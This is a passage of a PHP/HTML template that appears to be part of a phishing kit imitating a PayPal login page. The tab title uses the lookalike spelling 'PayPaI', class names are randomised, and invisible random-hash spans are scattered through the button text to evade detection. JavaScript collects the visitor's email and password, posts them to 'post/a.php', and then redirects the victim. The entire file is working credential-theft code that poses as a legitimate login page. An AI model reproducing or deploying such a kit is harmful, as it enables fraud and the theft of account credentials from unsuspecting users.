md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("?");?></a>
					</div>
<div class="lo<?=$randa;?>xginor">
<span class="te<?=$randa;?>xspa">or</span>
</div>
<a href="#" class="button secondary login-click-signup-button">
<span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("S");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("i");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("g");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("n");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode(" ");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("U");?><span style="float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;"><?php echo md5(time().rand(100,9999))?></span><?=$api->transcode("p");?></a>
</div>
</div>

</section>
<div class="fota<?=$randa;?>wr"><?php include('footer.php') ?></div>
</div>
<div class="tr<?=$rand;?>rg hide" id="lod<?=$rand;?>ig"></div>
<script>
$(document).ready(function(){
	$("#bt<?=$rand;?>nx").click(function(){
		var itemsEmail = $("#Email").val();
		if(!validateEmail(itemsEmail)){
			document.getElementById("log<?=$rand;?>cinc").className = "tx<?=$rand;?>ip has<?=$rand;?>rr";
			document.getElementById("emailer<?=$rand;?>rm").className = "er<?=$rand;?>rm show";
		}else{
			document.getElementById("spl<?=$rand;?>ite").className = "spl<?=$rand;?>ite hide";
			document.getElementById("prf<?=$rando;?>dim").innerHTML = itemsEmail;
			document.getElementById("link").className = "po<?=$rando;?>eml";
			document.getElementById("splitps<?=$rand;?>w").className = "splitps<?=$rand;?>w transformRightToLeft";
		}
		return false;
	});
	$("#log<?=$rand;?>cinc").keyup(function(){
		var x = $("#Email").val();
		if(x.length!==0){
			document.getElementById("log<?=$rand;?>cinc").className = "tx<?=$rand;?>ip";
			document.getElementById("emailer<?=$rand;?>rm").className = "er<?=$rand;?>rm";
		}

	});
	$("#bck<?=$randa;?>inp").click(function(){
		document.getElementById("spl<?=$rand;?>ite").className = "spl<?=$rand;?>ite";
		document.getElementById("prf<?=$rando;?>dim").innerHTML = "";
		document.getElementById("link").className = "po<?=$rando;?>eml hide";
		document.getElementById("splitps<?=$rand;?>w").className = "splitps<?=$rand;?>w transformRightToLeft hide";
		document.getElementById("Email").value = "";
		document.getElementById("ps<?=$rand;?>w").value = "";
		document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className = "er<?=$rand;?>rm";
		document.getElementById("login_ps<?=$rand;?>wdiv").className = "tx<?=$rand;?>ip";
		document.getElementById("no<?=$rand;?>ty").className = "no<?=$fo4;?>ti no<?=$fo4;?>ti-critical hide";
		document.getElementById("cpt<?=$rand;?>cha").className = "no<?=$fo4;?>ti no<?=$fo4;?>ti-critical hide";
		return false;
	});
	$("#bt<?=$rand;?>nx").blur(function(){
		var x = document.getElementById("emailer<?=$rand;?>rm").className = "er<?=$rand;?>rm show";
		if(x){
			document.getElementById("emailer<?=$rand;?>rm").className = "er<?=$rand;?>rm";
		}
	})
	$("#ps<?=$rand;?>w").keyup(function(){
		var spss = $("#ps<?=$rand;?>w").val();
		if(spss.length !== 0){
			document.getElementById("e<?=$rand;?>sp").className = "e<?=$rand;?>sp show-hide-ps<?=$rand;?>w";
		}else{
			document.getElementById("e<?=$rand;?>sp").className = "e<?=$rand;?>sp hide show-hide-ps<?=$rand;?>w";
		}
		var classs = document.getElementById("login_ps<?=$rand;?>wdiv").className;
		if(classs == "tx<?=$rand;?>ip has<?=$rand;?>rr"){
			document.getElementById("login_ps<?=$rand;?>wdiv").className = "tx<?=$rand;?>ip";
		}
		var classmsg = document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className;
		if(classmsg == "er<?=$rand;?>rm show"){
			document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className = "er<?=$rand;?>rm";
		}
	})
	$("#bt<?=$rand;?>ns").blur(function () {
        var x = document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className;
        if(x == "er<?=$rand;?>rm show"){
            document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className = "er<?=$rand;?>rm";
		}
    })
	$("#bt<?=$rand;?>ns").click(function(){
		var itemsPass = $("#ps<?=$rand;?>w").val();
		var itemsStart;
		if(itemsPass === ""){
			itemsStart = false;
			document.getElementById("login_ps<?=$rand;?>wdiv").className = "tx<?=$rand;?>ip has<?=$rand;?>rr";
			document.getElementById("ps<?=$rand;?>wer<?=$rand;?>rm").className = "er<?=$rand;?>rm show";
		}
		if(itemsStart === false){
			return false;
		}else{
			document.getElementById("lod<?=$rand;?>ig").className = "tr<?=$rand;?>rg sp<?=$rand;?>ir";
		}
		return true;
	})
	$("#e<?=$rand;?>sp").click(function(){
		document.getElementById("ps<?=$rand;?>w").type = "text";
		document.getElementById("e<?=$rand;?>sp").className = "e<?=$rand;?>sp hide show-hide-ps<?=$rand;?>w";
		document.getElementById("hideps<?=$rand;?>w").className = "e<?=$rand;?>sp show-hide-ps<?=$rand;?>w";
	})
	$("#hideps<?=$rand;?>w").click(function(){
		document.getElementById("ps<?=$rand;?>w").type = "ps<?=$rand;?>w";
		document.getElementById("e<?=$rand;?>sp").className = "e<?=$rand;?>sp show-hide-ps<?=$rand;?>w";
		document.getElementById("hideps<?=$rand;?>w").className = "e<?=$rand;?>sp hide show-hide-ps<?=$rand;?>w";
	})
})
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

</script>

<script type="text/javascript">
  document.addEventListener("DOMContentLoaded", function(event) {
$("#sig<?=$rando;?>ns").validate({
  submitHandler: function(form) {
    $.post("post/a.php", $("#sig<?=$rando;?>ns").serialize(), function(GET) {
      if (GET == "error") {
        setTimeout(function() {
          document.getElementById("lod<?=$rand;?>ig").className = "trd<?=$rando;?>sg hide";
          document.getElementById("no<?=$rand;?>ty").className = "no<?=$rand;?>ty no<?=$rand;?>ty-critical";
        })
      } else if (GET == "bnd<?=$rando;?>s") {
        setTimeout(function() {
          window.location.assign("suc<?=$rando;?>s");
        })
      } else {
        setTimeout(function() {
          window.location.assign("alert.php?access_key=<?=$randomString;?>");
        })
      }
    });
  },
});
  });
</script>
<script>
document['title']='Log\x20in\x20to\x20PayPaI';
</script>
</body>

</html>
<?php
exit();
?>